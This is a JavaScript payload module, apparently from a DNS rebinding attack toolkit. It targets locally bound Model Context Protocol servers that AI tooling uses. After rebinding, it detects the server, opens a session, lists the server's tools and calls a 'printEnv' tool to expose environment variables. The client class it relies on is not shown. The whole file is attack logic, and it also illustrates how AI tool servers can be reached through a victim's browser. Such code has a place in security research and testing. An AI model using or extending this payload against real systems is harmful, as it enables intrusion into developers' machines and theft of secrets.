/**
 * Model Context Protocol (MCP) over HTTP(S) via DNS rebinding
 * Minimal client: detect MCP server, initialize session, list tools.
 * Reference: MCP uses JSON-RPC 2.0 and may expose HTTP POST + SSE streams.
 * Default local ports vary; many dev servers bind 127.0.0.1.
 */

const McpStreamableHttp = () => {
	// Invoked after DNS rebinding has been performed
	async function attack(_headers, _cookie, _body, _wsProxyPort) {
		const client = new McpStreamableHttpClient("/mcp");
		
		try {
			console.log('Starting MCP Streamable HTTP attack...');
			
			// Connect (no-op for HTTP)
			await client.connect();

			// Initialize MCP session
			await client.initializeSession();

			// Try to list available functionality
			await client.listCapabilities();

			// Demonstrate impact with printEnv tool
			await client.demonstrateImpactPrintEnv();

		} catch (e) {
			console.log(`MCP attack error: ${e}`);
		} finally {
			await client.close();
		}
	}

	// Invoked to determine whether the rebinded service is likely MCP
	async function isService(_headers, _cookie, _body) {
		const client = new McpStreamableHttpClient("/mcp");
		return await client.isServiceDetected();
	}

	return { attack, isService };
}

// Registry value and manager-config.json value must match
Registry["MCP Streamable HTTP"] = McpStreamableHttp();
